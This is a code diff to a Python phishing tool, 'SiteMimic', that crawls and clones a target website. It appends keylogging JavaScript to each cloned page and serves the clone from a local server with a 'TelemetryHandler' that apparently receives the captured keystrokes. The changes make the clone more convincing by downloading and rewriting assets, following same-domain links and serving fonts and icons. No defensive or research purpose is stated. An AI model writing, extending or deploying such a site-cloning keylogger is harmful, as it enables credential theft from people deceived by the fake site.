@@ -5,6 +5,7 @@ import time
 import threading
 import urllib.parse
 import requests
+import hashlib
 from pathlib import Path
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from urllib.parse import urlparse, parse_qs, unquote
@@ -26,6 +27,7 @@ class SiteMimic:
         
         self.visited = set()
         self.keylog_js = self._generate_keylog_js()
+        self.asset_cache = {} # url -> local_path
 
     def _generate_keylog_js(self):
         """Generates the JavaScript code to be injected into the page."""
@@ -102,28 +104,90 @@ class SiteMimic:
     def _resolve_url(self, url):
         return urllib.parse.urljoin(self.base_url, url)
 
-    def _download_asset(self, url, save_path):
+    def _get_safe_asset_path(self, url):
+        """
+        Generates a safe, short, unique filename for an asset URL.
+        Uses the basename of the URL + a short MD5 hash of the full URL.
+        """
+        if not url:
+            return None
+            
+        parsed = urlparse(url)
+        # Get the last part of the path (e.g., 'script.js' from '/js/script.js')
+        basename = os.path.basename(parsed.path)
+        
+        # If basename is empty or too generic, use a generic name
+        if not basename or basename in [os.sep, '/', '']:
+            basename = "asset"
+            
+        # Ensure basename has an extension if possible, otherwise default to .bin
+        if '.' not in basename:
+            basename += ".bin"
+            
+        # Create a short hash of the full URL to ensure uniqueness
+        url_hash = hashlib.md5(url.encode('utf-8')).hexdigest()[:8]
+        
+        # Combine basename and hash: script.js.1a2b3c4d
+        safe_name = f"{basename}.{url_hash}"
+        
+        # Limit length just in case
+        if len(safe_name) > 100:
+            # Truncate basename if necessary
+            ext = os.path.splitext(basename)[1]
+            base = os.path.splitext(basename)[0]
+            max_base_len = 100 - len(url_hash) - 1 - len(ext)
+            safe_name = f"{base[:max_base_len]}.{ext}.{url_hash}"
+            
+        return self.output_dir / "static" / safe_name
+
+    def _download_asset(self, url):
+        """
+        Downloads an asset and returns the relative path from the mimic_site root.
+        Returns None if failed.
+        """
+        if url in self.asset_cache:
+            return self.asset_cache[url]
+            
+        safe_path = self._get_safe_asset_path(url)
+        
+        if not safe_path:
+            return None
+
         try:
             if url.startswith(('http://', 'https://')):
                 response = self.session.get(url, timeout=10)
                 if response.status_code == 200:
-                    save_path.parent.mkdir(parents=True, exist_ok=True)
-                    save_path.write_bytes(response.content)
-                    return save_path
+                    safe_path.parent.mkdir(parents=True, exist_ok=True)
+                    safe_path.write_bytes(response.content)
+                    # Store relative path from output_dir
+                    relative_path = safe_path.relative_to(self.output_dir)
+                    self.asset_cache[url] = str(relative_path)
+                    return str(relative_path)
             return None
         except Exception as e:
             print(f"Failed to download asset {url}: {e}")
             return None
 
     def _rewrite_asset_url(self, url):
-        """Converts absolute URLs to relative paths based on our output structure."""
-        if not url or url.startswith('data:') or url.startswith('#'):
+        """
+        Returns the local relative path for the asset, downloading it if necessary.
+        """
+        if not url or url.startswith('data:') or url.startswith('#') or url.startswith('mailto:'):
             return url
+            
+        # Resolve relative URLs to absolute
+        absolute_url = self._resolve_url(url)
         
-        parsed = urlparse(self._resolve_url(url))
-        # Store assets in a 'static' folder relative to the HTML file
-        relative_path = f"static{parsed.path}"
-        return relative_path
+        # Only process external HTTP(S) resources
+        if not absolute_url.startswith(('http://', 'https://')):
+            return url
+
+        local_path = self._download_asset(absolute_url)
+        if local_path:
+            return local_path
+        else:
+            # If download failed, return the original URL (best effort)
+            return url
 
     def fetch_site(self, max_depth=3):
         print(f"Fetching {self.base_url}...")
@@ -159,8 +223,6 @@ class SiteMimic:
             html_content += self.keylog_js
 
         # 2. Rewrite asset URLs (CSS, JS, Images)
-        # This is a simplified regex approach for common asset tags.
-        # A robust solution would use BeautifulSoup.
         import re
         asset_patterns = [
             r'src=["\']([^"\']+)["\']',
@@ -171,16 +233,14 @@ class SiteMimic:
         for pattern in asset_patterns:
             matches = re.findall(pattern, html_content)
             for match in matches:
-                if match.startswith(('http', 'data:', '#')):
-                    new_url = self._rewrite_asset_url(match)
-                    # Download the asset if it's an external resource
-                    if match.startswith('http'):
-                        # Create a deterministic filename for the asset
-                        asset_name = match.replace('/', '_').replace(':', '_')
-                        asset_path = self.output_dir / "static" / asset_name
-                        if not asset_path.exists():
-                            self._download_asset(match, asset_path)
-                    html_content = html_content.replace(match, new_url, 1)
+                # Skip internal anchors, data URIs, etc.
+                if match.startswith(('data:', '#', 'mailto:', 'javascript:')):
+                    continue
+                
+                # Resolve and rewrite
+                new_url = self._rewrite_asset_url(match)
+                if new_url != match:
+                    html_content = html_content.replace(match, new_url)
 
         save_path.write_text(html_content, encoding='utf-8')
         print(f"Saved: {save_path}")
@@ -192,11 +252,13 @@ class SiteMimic:
             for link in internal_links:
                 if not link.startswith('http'):
                     full_link = self._resolve_url(link)
-                    if full_link.startswith(self.base_url.split('//')[0]):
+                    # Only follow links within the same domain
+                    if urlparse(full_link).netloc == urlparse(self.base_url).netloc:
                         # Calculate relative path for recursive call
-                        # Simplified: just pass the path portion
                         link_path = urlparse(full_link).path
-                        self._process_page(full_link, link_path.lstrip('/'), max_depth, current_depth + 1)
+                        # Ensure path doesn't start with /
+                        link_path = link_path.lstrip('/')
+                        self._process_page(full_link, link_path, max_depth, current_depth + 1)
 
 class TelemetryHandler(BaseHTTPRequestHandler):
     def do_POST(self):
@@ -243,6 +305,16 @@ class TelemetryHandler(BaseHTTPRequestHandler):
                 content_type = 'image/jpeg'
             elif path.endswith('.svg'):
                 content_type = 'image/svg+xml'
+            elif path.endswith('.webp'):
+                content_type = 'image/webp'
+            elif path.endswith('.woff'):
+                content_type = 'font/woff'
+            elif path.endswith('.woff2'):
+                content_type = 'font/woff2'
+            elif path.endswith('.ttf'):
+                content_type = 'font/ttf'
+            elif path.endswith('.ico'):
+                content_type = 'image/x-icon'
                 
             self.send_header('Content-Type', content_type)
             self.end_headers()
@@ -292,6 +364,12 @@ def main():
             
         port_input = input("Enter port (default 8080): ").strip()
         port = int(port_input) if port_input.isdigit() else 8080
+
+    # Clean up previous run
+    import shutil
+    if os.path.exists("mimic_site"):
+        print("Cleaning previous run...")
+        shutil.rmtree("mimic_site")
 
     print("\nPhase 1: Building Website Clone...")
     mimicker = SiteMimic(target)
